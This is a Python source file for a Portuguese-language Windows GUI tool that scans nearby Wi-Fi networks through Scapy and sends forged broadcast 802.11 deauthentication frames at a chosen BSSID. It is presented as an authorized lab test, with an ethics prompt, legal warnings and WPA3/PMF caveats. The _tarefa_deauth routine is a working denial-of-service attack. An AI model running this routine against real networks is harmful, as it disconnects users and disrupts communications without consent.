"""Ferramenta: Teste de desautenticação Wi-Fi (802.11 Deauth).

A descoberta de redes usa o Scapy (beacons 802.11) e, como alternativa, o pywifi
para enumerar adaptadores sem fio. O teste envia um quadro de desautenticação por
segundo durante a duração escolhida, em uma tarefa assíncrona cancelável.

Redes WPA3 e redes com PMF (802.11w) ignoram quadros de desautenticação forjados;
o teste é indicado apenas para laboratório com redes próprias ou autorizadas.
"""
from __future__ import annotations

import re
import threading
import time
from typing import Any, Dict, List, Optional

from PySide6.QtCore import QObject, QTimer, Signal
from PySide6.QtWidgets import (
    QComboBox,
    QHeaderView,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QPushButton,
    QSpinBox,
    QWidget,
)

from wintoolbox.core.elevation import is_admin
from wintoolbox.core.registry import Tool, register
from wintoolbox.tools._helpers import (
    DependenciaAusente,
    aviso_dependencia,
    confirmar_termo_etico,
    dependencia_disponivel,
    formatar_numero,
    garantir_admin,
)
from wintoolbox.tools._widgets import (
    PainelFerramenta,
    adicionar_log_painel,
    botao_copiar,
    criar_aviso,
    criar_card,
    criar_saida_texto,
    criar_tabela,
    executar_assincrono,
    mostrar_erro,
    preencher_tabela,
)

TEXTO_ETICO = (
    "O envio de quadros de desautenticação derruba conexões Wi-Fi de clientes "
    "reais, podendo interromper serviços, chamadas e transferências em andamento.\n\n"
    "Execute somente em redes e clientes que você administra ou para os quais "
    "possui autorização expressa e por escrito do responsável, com horário e "
    "escopo definidos.\n\n"
    "A interrupção não autorizada de comunicações é crime previsto na Lei "
    "12.737/2012 (art. 154-A do Código Penal) e pode violar a Lei 13.709/2018 "
    "(LGPD).\n\n"
    "Você declara possuir autorização por escrito e assume integral "
    "responsabilidade pelo teste?"
)

PADRAO_MAC = re.compile(r"^(?:[0-9A-Fa-f]{2}[:-]){5}[0-9A-Fa-f]{2}$")
INTERVALO_QUADRO = 1.0
INTERVALO_LOOP = 0.1


class _SinaisDeauth(QObject):
    """Sinais emitidos pela thread do teste de desautenticação."""

    contadores = Signal(object)


def _listar_interfaces() -> List[tuple[str, str]]:
    """Lista adaptadores via Scapy ou, na falta dele, via pywifi."""
    try:
        from scapy.all import conf

        pares: List[tuple[str, str]] = []
        vistos: set[str] = set()
        for interface in conf.ifaces.values():
            nome = getattr(interface, "name", "") or ""
            if not nome or nome in vistos:
                continue
            vistos.add(nome)
            descricao = getattr(interface, "description", "") or nome
            pares.append((descricao, nome))
        if pares:
            return pares
    except Exception:
        pass

    try:
        import pywifi

        pares = []
        for indice, interface in enumerate(pywifi.PyWiFi().interfaces()):
            nome = getattr(interface, "name", lambda: f"Wi-Fi {indice}")()
            pares.append((f"{nome} (pywifi)", nome))
        return pares
    except Exception:
        return []


def _normalizar_bssid(valor: str) -> str:
    """Valida e normaliza o BSSID no formato aa:bb:cc:dd:ee:ff."""
    texto = str(valor or "").strip().replace("-", ":").lower()
    if not PADRAO_MAC.match(texto):
        raise ValueError("Informe um BSSID válido no formato aa:bb:cc:dd:ee:ff.")
    return texto


def _descrever_beacon(pacote: Any) -> Optional[Dict[str, Any]]:
    """Extrai SSID, canal, segurança e sinal de um beacon 802.11."""
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
    from scapy.layers.radiotap import RadioTap

    if not pacote.haslayer(Dot11Beacon):
        return None
    camada = pacote[Dot11]
    bssid = str(camada.addr2 or "").lower()
    if not bssid:
        return None

    ssid = ""
    canal = 0
    rsn = False
    wpa = False
    sae = False
    elemento = pacote.getlayer(Dot11Elt)
    while elemento is not None:
        try:
            identificador = int(elemento.ID)
            informacao = bytes(elemento.info)
            if identificador == 0:
                ssid = informacao.decode("utf-8", errors="replace")
            elif identificador == 3 and informacao:
                canal = int(informacao[0])
            elif identificador == 48:
                rsn = True
                if b"\x00\x0f\xac\x08" in informacao:
                    sae = True
            elif identificador == 221 and informacao.startswith(b"\x00\x50\xf2"):
                wpa = True
        except (ValueError, IndexError):
            pass
        seguinte = elemento.payload
        elemento = seguinte if isinstance(seguinte, Dot11Elt) else None

    if sae:
        seguranca = "WPA3-SAE"
    elif rsn:
        seguranca = "WPA2 (RSN)"
    elif wpa:
        seguranca = "WPA"
    else:
        seguranca = "Aberta"

    sinal = 0
    if pacote.haslayer(RadioTap):
        try:
            sinal = int(pacote[RadioTap].dBm_antsignal)
        except (TypeError, ValueError):
            sinal = 0

    return {
        "ssid": ssid or "(oculto)",
        "bssid": bssid,
        "canal": canal,
        "seguranca": seguranca,
        "sinal": sinal,
    }


def _tarefa_scan(
    interface: str, duracao: int, parar: threading.Event, ctx: Any
) -> List[Dict[str, Any]]:
    """Coleta beacons durante a janela informada e devolve as redes únicas."""
    from scapy.all import AsyncSniffer

    redes: Dict[str, Dict[str, Any]] = {}

    def coletar(pacote) -> None:
        if parar.is_set():
            return
        try:
            dados = _descrever_beacon(pacote)
        except Exception:
            return
        if dados:
            redes[dados["bssid"]] = dados

    sniffer = AsyncSniffer(
        iface=interface or None, prn=coletar, store=False
    )
    sniffer.start()
    time.sleep(0.4)
    falha = getattr(sniffer, "exception", None)
    if falha:
        try:
            sniffer.stop()
        except Exception:
            pass
        raise RuntimeError(f"Não foi possível iniciar a varredura Wi-Fi: {falha}")

    limite = time.monotonic() + max(1, duracao)
    try:
        while (
            time.monotonic() < limite
            and not parar.is_set()
            and not ctx.cancelled()
        ):
            time.sleep(INTERVALO_LOOP)
    finally:
        try:
            sniffer.stop()
        except Exception:
            pass
    return sorted(redes.values(), key=lambda item: (-int(item["sinal"]), item["ssid"]))


def _tarefa_deauth(
    params: Dict[str, Any],
    sinais: _SinaisDeauth,
    parar: threading.Event,
    ctx: Any,
) -> Dict[str, Any]:
    """Envia um quadro de desautenticação por segundo durante a duração."""
    from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp

    interface = params.get("interface") or ""
    bssid = params["bssid"]
    canal = int(params.get("canal") or 0)
    duracao = int(params["duracao"])

    quadro = (
        RadioTap()
        / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid)
        / Dot11Deauth(reason=7)
    )

    eventos: List[Dict[str, Any]] = []
    enviados = 0
    inicio = time.monotonic()
    try:
        while not parar.is_set() and not ctx.cancelled():
            decorrido = time.monotonic() - inicio
            if decorrido >= duracao:
                break
            sendp(quadro, iface=interface or None, verbose=0)
            enviados += 1
            eventos.append(
                {
                    "hora": time.strftime("%H:%M:%S"),
                    "quadro": enviados,
                    "bssid": bssid,
                    "canal": canal,
                    "status": "Enviado",
                }
            )
            sinais.contadores.emit(
                {
                    "fase": "enviando",
                    "enviados": enviados,
                    "decorrido": decorrido,
                    "restante": max(0.0, duracao - decorrido),
                }
            )
            limite = time.monotonic() + INTERVALO_QUADRO
            while (
                time.monotonic() < limite
                and not parar.is_set()
                and not ctx.cancelled()
            ):
                time.sleep(INTERVALO_LOOP)
    finally:
        sinais.contadores.emit(
            {
                "fase": "encerrado",
                "enviados": enviados,
                "decorrido": time.monotonic() - inicio,
                "restante": 0.0,
            }
        )

    return {
        "enviados": enviados,
        "duracao": time.monotonic() - inicio,
        "bssid": bssid,
        "canal": canal,
        "eventos": eventos,
    }


@register
class DeauthTestTool(Tool):
    """Ferramenta de teste de desautenticação Wi-Fi."""

    id = "network.deauth_test"
    name = "Teste de Desautenticação Wi-Fi"
    category = "Rede e Internet"
    description = (
        "Descobre redes próximas com BSSID, canal e segurança, envia um quadro de "
        "desautenticação por segundo e gera relatório com alerta para WPA3"
    )
    keywords = [
        "wifi",
        "wi-fi",
        "deauth",
        "desautenticação",
        "802.11",
        "bssid",
        "canal",
        "wpa3",
        "pmf",
        "monitor",
    ]
    requires_admin = True
    optional_deps = ["scapy", "pywifi"]

    def build_view(self, parent: Optional[QWidget] = None) -> QWidget:
        return DeauthTestView(self, parent)


class DeauthTestView(PainelFerramenta):
    """Página interativa do teste de desautenticação."""

    def __init__(self, tool: DeauthTestTool, parent: Optional[QWidget] = None) -> None:
        super().__init__(tool, parent)
        self.sinais = _SinaisDeauth(self)
        self._parar = threading.Event()
        self._executando = False
        self._modo = ""
        self._redes: List[Dict[str, Any]] = []
        self._eventos: List[List[str]] = []
        self._montar_interface()
        self.sinais.contadores.connect(self._ao_contadores)
        if dependencia_disponivel("scapy") or dependencia_disponivel("pywifi"):
            QTimer.singleShot(0, self._atualizar_interfaces)

    # ------------------------------------------------------------------ UI
    def _montar_interface(self) -> None:
        self.adicionar(
            criar_aviso(
                "WPA3-SAE e redes com PMF (802.11w) descartam quadros de "
                "desautenticação forjados: nelas o teste não derruba clientes. O "
                "adaptador precisa estar em modo monitor para capturar beacons e "
                "transmitir quadros 802.11; o Npcap nem sempre expõe esse modo.",
                self,
                destaque=True,
            )
        )
        self._montar_cartao_admin()

        cartao_redes, layout_redes = self.adicionar_card("Redes próximas")
        linha_redes = QHBoxLayout()
        linha_redes.addWidget(QLabel("Interface:"))
        self.cmb_interface = QComboBox()
        self.cmb_interface.addItem("Automático (padrão do sistema)", "")
        self.cmb_interface.setMinimumWidth(220)
        linha_redes.addWidget(self.cmb_interface, stretch=1)

        self.btn_atualizar = QPushButton("Atualizar interfaces")
        self.btn_atualizar.clicked.connect(self._atualizar_interfaces)
        linha_redes.addWidget(self.btn_atualizar)

        linha_redes.addWidget(QLabel("Duração da varredura (s):"))
        self.spin_scan = QSpinBox()
        self.spin_scan.setRange(3, 30)
        self.spin_scan.setValue(8)
        linha_redes.addWidget(self.spin_scan)

        self.btn_escanear = QPushButton("Escanear redes")
        self.btn_escanear.clicked.connect(self._escanear)
        linha_redes.addWidget(self.btn_escanear)
        layout_redes.addLayout(linha_redes)

        self.tabela_redes = criar_tabela(
            ["SSID", "BSSID", "Canal", "Segurança", "Sinal (dBm)"], self
        )
        cabecalho = self.tabela_redes.horizontalHeader()
        for coluna in range(4):
            cabecalho.setSectionResizeMode(coluna, QHeaderView.ResizeMode.ResizeToContents)
        cabecalho.setSectionResizeMode(0, QHeaderView.ResizeMode.Stretch)
        self.tabela_redes.setMinimumHeight(190)
        self.tabela_redes.cellDoubleClicked.connect(self._usar_rede)
        layout_redes.addWidget(self.tabela_redes)

        linha_uso = QHBoxLayout()
        self.btn_usar = QPushButton("Usar rede selecionada")
        self.btn_usar.clicked.connect(lambda: self._usar_rede(self.tabela_redes.currentRow(), 0))
        linha_uso.addWidget(self.btn_usar)
        self.lbl_redes = QLabel(
            "Dê um duplo clique em uma rede para preencher BSSID e canal."
        )
        self.lbl_redes.setProperty("class", "secondary")
        linha_uso.addWidget(self.lbl_redes, stretch=1)
        layout_redes.addLayout(linha_uso)

        cartao_teste, layout_teste = self.adicionar_card("Teste de desautenticação")
        linha_alvo = QHBoxLayout()
        linha_alvo.addWidget(QLabel("BSSID:"))
        self.txt_bssid = QLineEdit()
        self.txt_bssid.setPlaceholderText("aa:bb:cc:dd:ee:ff")
        self.txt_bssid.setMaximumWidth(200)
        linha_alvo.addWidget(self.txt_bssid)

        linha_alvo.addWidget(QLabel("Canal:"))
        self.spin_canal = QSpinBox()
        self.spin_canal.setRange(1, 196)
        self.spin_canal.setValue(6)
        linha_alvo.addWidget(self.spin_canal)

        linha_alvo.addWidget(QLabel("Duração (s):"))
        self.spin_duracao = QSpinBox()
        self.spin_duracao.setRange(5, 120)
        self.spin_duracao.setValue(10)
        linha_alvo.addWidget(self.spin_duracao)
        linha_alvo.addStretch()
        layout_teste.addLayout(linha_alvo)

        linha_controle = QHBoxLayout()
        self.btn_iniciar = QPushButton("Iniciar teste")
        self.btn_iniciar.setProperty("class", "primary")
        self.btn_iniciar.clicked.connect(self._iniciar_teste)
        linha_controle.addWidget(self.btn_iniciar)

        self.btn_parar = QPushButton("Parar / cancelar")
        self.btn_parar.setEnabled(False)
        self.btn_parar.clicked.connect(self._parar_operacao)
        linha_controle.addWidget(self.btn_parar)
        linha_controle.addStretch()
        layout_teste.addLayout(linha_controle)

        self.lbl_enviados = QLabel("Quadros enviados: 0")
        self.lbl_restante = QLabel("Tempo restante: 0,0 s")
        self.lbl_estado = QLabel("Estado: parado")
        for etiqueta in (self.lbl_enviados, self.lbl_restante, self.lbl_estado):
            etiqueta.setProperty("class", "secondary")
            linha_contadores = QHBoxLayout()
            linha_contadores.addWidget(etiqueta)
            linha_contadores.addStretch()
            layout_teste.addLayout(linha_contadores)

        self.lbl_status = QLabel("Escaneie as redes ou informe o BSSID manualmente.")
        self.lbl_status.setProperty("class", "secondary")
        self.lbl_status.setWordWrap(True)
        layout_teste.addWidget(self.lbl_status)

        cartao_eventos, layout_eventos = self.adicionar_card("Eventos do teste")
        self.tabela_eventos = criar_tabela(
            ["Hora", "Quadro", "BSSID", "Canal", "Status"], self
        )
        cabecalho_eventos = self.tabela_eventos.horizontalHeader()
        for coluna in range(4):
            cabecalho_eventos.setSectionResizeMode(
                coluna, QHeaderView.ResizeMode.ResizeToContents
            )
        cabecalho_eventos.setSectionResizeMode(2, QHeaderView.ResizeMode.Stretch)
        self.tabela_eventos.setMinimumHeight(170)
        layout_eventos.addWidget(self.tabela_eventos)

        cartao_relatorio, layout_relatorio = self.adicionar_card("Relatório do teste")
        self.txt_relatorio = criar_saida_texto(140, self)
        layout_relatorio.addWidget(self.txt_relatorio)
        linha_relatorio = QHBoxLayout()
        linha_relatorio.addWidget(
            botao_copiar(lambda: self.txt_relatorio.toPlainText(), self, "Copiar relatório")
        )
        linha_relatorio.addStretch()
        layout_relatorio.addLayout(linha_relatorio)

        self.log_panel = adicionar_log_painel(self, "Log do teste Wi-Fi")
        self._definir_ocupado(False)

    def _montar_cartao_admin(self) -> None:
        cartao, layout = criar_card("Privilégios de Administrador", self)
        self.lbl_admin = QLabel()
        self.lbl_admin.setWordWrap(True)
        self.lbl_admin.setProperty("class", "secondary")
        self.btn_admin = QPushButton("Reiniciar como Administrador")
        self.btn_admin.clicked.connect(self._solicitar_admin)
        linha = QHBoxLayout()
        linha.addWidget(self.lbl_admin, stretch=1)
        linha.addWidget(self.btn_admin)
        layout.addLayout(linha)
        self.adicionar(cartao)
        self._atualizar_status_admin()

    def _solicitar_admin(self) -> None:
        garantir_admin(self, self.tool.name, permitir_continuar=False)
        self._atualizar_status_admin()

    def _atualizar_status_admin(self) -> None:
        if is_admin():
            self.lbl_admin.setText(
                "Executando com privilégios de Administrador. A varredura e o envio "
                "802.11 estão disponíveis."
            )
            self.btn_admin.setEnabled(False)
            self.btn_admin.setToolTip("O aplicativo já está elevado.")
        else:
            self.lbl_admin.setText(
                "Executando como usuário padrão. A varredura e o envio de quadros "
                "exigem Administrador e o Npcap instalado."
            )
            self.btn_admin.setEnabled(True)
            self.btn_admin.setToolTip("Solicita a elevação do aplicativo via UAC.")

    def _atualizar_interfaces(self) -> None:
        if not dependencia_disponivel("scapy") and not dependencia_disponivel("pywifi"):
            self.log_panel.append_log(
                "AVISO",
                "Scapy e pywifi não estão instalados: apenas a interface automática "
                "está disponível.",
            )
            return
        atual = self.cmb_interface.currentData()
        pares = _listar_interfaces()
        self.cmb_interface.blockSignals(True)
        self.cmb_interface.clear()
        self.cmb_interface.addItem("Automático (padrão do sistema)", "")
        for rotulo, nome in pares:
            self.cmb_interface.addItem(rotulo, nome)
        indice = self.cmb_interface.findData(atual) if atual else 0
        self.cmb_interface.setCurrentIndex(max(0, indice))
        self.cmb_interface.blockSignals(False)

    def _definir_ocupado(self, ocupado: bool) -> None:
        self._executando = ocupado
        self.btn_iniciar.setEnabled(not ocupado)
        self.btn_parar.setEnabled(ocupado)
        self.btn_escanear.setEnabled(not ocupado)
        self.btn_usar.setEnabled(not ocupado)
        self.btn_atualizar.setEnabled(not ocupado)
        self.spin_scan.setEnabled(not ocupado)
        self.cmb_interface.setEnabled(not ocupado)
        self.txt_bssid.setEnabled(not ocupado)
        self.spin_canal.setEnabled(not ocupado)
        self.spin_duracao.setEnabled(not ocupado)
        if not ocupado:
            self._modo = ""

    def _verificar_scapy(self) -> bool:
        if dependencia_disponivel("scapy"):
            return True
        aviso_dependencia(self, DependenciaAusente("Scapy", "scapy.all", "scapy"))
        return False

    # -------------------------------------------------------------- varredura
    def _escanear(self) -> None:
        if self._executando:
            return
        if not confirmar_termo_etico(self, self.tool.id, TEXTO_ETICO):
            return
        if not self._verificar_scapy():
            return
        if not garantir_admin(self, self.tool.name, permitir_continuar=False):
            return
        self._atualizar_status_admin()

        interface = self.cmb_interface.currentData() or ""
        duracao = int(self.spin_scan.value())
        self._parar.clear()
        self._modo = "escaneando"
        self._definir_ocupado(True)
        self.lbl_estado.setText("Estado: escaneando")
        self.lbl_status.setText(f"Coletando beacons por {duracao} s...")

        def tarefa(ctx) -> List[Dict[str, Any]]:
            return _tarefa_scan(interface, duracao, self._parar, ctx)

        executar_assincrono(
            self,
            tarefa,
            ao_concluir=self._scan_concluido,
            ao_falhar=self._falhou,
        )

    def _scan_concluido(self, redes: List[Dict[str, Any]]) -> None:
        self._definir_ocupado(False)
        self._redes = list(redes)
        preencher_tabela(
            self.tabela_redes,
            [
                [
                    item["ssid"],
                    item["bssid"],
                    item["canal"],
                    item["seguranca"],
                    item["sinal"],
                ]
                for item in redes
            ],
        )
        self.lbl_redes.setText(
            f"{len(redes)} rede(s) encontrada(s). Dê um duplo clique para usar."
        )
        self.lbl_estado.setText("Estado: parado")
        self.lbl_status.setText(f"Varredura concluída: {len(redes)} rede(s).")
        self.log_panel.append_log("INFO", f"Varredura Wi-Fi: {len(redes)} rede(s).")
        if not redes:
            self.log_panel.append_log(
                "AVISO",
                "Nenhum beacon recebido. Verifique o modo monitor do adaptador e o Npcap.",
            )

    def _usar_rede(self, linha: int, _coluna: int) -> None:
        if self._executando or linha < 0 or linha >= len(self._redes):
            return
        rede = self._redes[linha]
        self.txt_bssid.setText(rede["bssid"])
        if rede["canal"]:
            self.spin_canal.setValue(int(rede["canal"]))
        self.lbl_status.setText(
            f"Rede selecionada: {rede['ssid']} ({rede['bssid']}), "
            f"canal {rede['canal']}, segurança {rede['seguranca']}."
        )
        if "WPA3" in str(rede["seguranca"]).upper():
            self.log_panel.append_log(
                "AVISO",
                "A rede usa WPA3/SAE: quadros de desautenticação tendem a ser "
                "ignorados pelo PMF.",
            )

    # ----------------------------------------------------------------- teste
    def _iniciar_teste(self) -> None:
        if self._executando:
            return
        try:
            bssid = _normalizar_bssid(self.txt_bssid.text())
        except ValueError as exc:
            mostrar_erro(self, "BSSID inválido", exc)
            return
        if not confirmar_termo_etico(self, self.tool.id, TEXTO_ETICO):
            return
        if not self._verificar_scapy():
            return
        if not garantir_admin(self, self.tool.name, permitir_continuar=False):
            return
        self._atualizar_status_admin()

        params = {
            "bssid": bssid,
            "canal": int(self.spin_canal.value()),
            "duracao": int(self.spin_duracao.value()),
            "interface": self.cmb_interface.currentData() or "",
        }
        self._parar.clear()
        self._modo = "testando"
        self._definir_ocupado(True)
        self.lbl_estado.setText("Estado: enviando quadros")
        self.lbl_status.setText(
            f"Enviando 1 quadro de desautenticação por segundo para {bssid}."
        )
        self._eventos.clear()
        preencher_tabela(self.tabela_eventos, [])
        self.log_panel.append_log(
            "ALERTA",
            f"Teste de desautenticação iniciado para {bssid} por "
            f"{params['duracao']} s.",
        )

        def tarefa(ctx) -> Dict[str, Any]:
            return _tarefa_deauth(params, self.sinais, self._parar, ctx)

        executar_assincrono(
            self,
            tarefa,
            ao_concluir=self._teste_concluido,
            ao_falhar=self._falhou,
            ao_logar=self.log_panel.append_log,
        )

    def _parar_operacao(self) -> None:
        if not self._executando:
            return
        self._parar.set()
        self.runner.cancel_current()
        self.btn_parar.setEnabled(False)
        self.lbl_estado.setText("Estado: parando")
        self.lbl_status.setText("Parada solicitada; aguardando o encerramento da tarefa.")

    def _ao_contadores(self, dados: Dict[str, Any]) -> None:
        self.lbl_enviados.setText(
            f"Quadros enviados: {formatar_numero(int(dados.get('enviados', 0)))}"
        )
        self.lbl_restante.setText(
            f"Tempo restante: {float(dados.get('restante', 0.0)):.1f} s".replace(".", ",")
        )
        if str(dados.get("fase", "")) == "encerrado":
            self.lbl_estado.setText("Estado: parado")

    def _teste_concluido(self, resultado: Dict[str, Any]) -> None:
        self._definir_ocupado(False)
        self.lbl_estado.setText("Estado: parado")
        eventos = resultado.get("eventos") or []
        self._eventos = [
            [
                str(item.get("hora", "")),
                str(item.get("quadro", "")),
                str(item.get("bssid", "")),
                str(item.get("canal", "")),
                str(item.get("status", "")),
            ]
            for item in eventos
        ]
        preencher_tabela(self.tabela_eventos, self._eventos)

        duracao = f"{float(resultado.get('duracao', 0.0)):.1f}".replace(".", ",")
        self.lbl_enviados.setText(
            f"Quadros enviados: {formatar_numero(int(resultado.get('enviados', 0)))}"
        )
        self.lbl_restante.setText("Tempo restante: 0,0 s")
        self.lbl_status.setText(
            f"Teste encerrado: {formatar_numero(int(resultado.get('enviados', 0)))} "
            f"quadro(s) em {duracao} s."
        )
        relatorio = [
            "Relatório do teste de desautenticação Wi-Fi",
            f"Gerado em: {time.strftime('%d/%m/%Y %H:%M:%S')}",
            f"BSSID: {resultado.get('bssid')}",
            f"Canal informado: {resultado.get('canal')}",
            f"Quadros enviados: {formatar_numero(int(resultado.get('enviados', 0)))}",
            f"Duração: {duracao} s",
            "Motivo do quadro: 7 (classe 3, estação saindo)",
            "",
            "Observação: redes WPA3-SAE ou com PMF (802.11w) ignoram quadros de "
            "desautenticação forjados. Verifique se o cliente reconectou antes de "
            "concluir que o teste teve efeito.",
        ]
        self.txt_relatorio.setPlainText("\n".join(relatorio))
        self.log_panel.append_log("INFO", "Teste de desautenticação encerrado.")

    def _falhou(self, erro: Exception) -> None:
        self._definir_ocupado(False)
        self.lbl_estado.setText("Estado: parado")
        self.lbl_status.setText("A operação não foi concluída.")
        texto = str(erro)
        self.log_panel.append_log("ERRO", texto)
        if "Esta ferramenta requer" in texto:
            aviso_dependencia(self, erro)
        else:
            mostrar_erro(self, "Falha no teste de desautenticação", texto)

    def hideEvent(self, evento) -> None:  # noqa: N802 (assinatura Qt)
        """Sair da página interrompe o teste em andamento."""
        if self._executando:
            self._parar_operacao()
        super().hideEvent(evento)
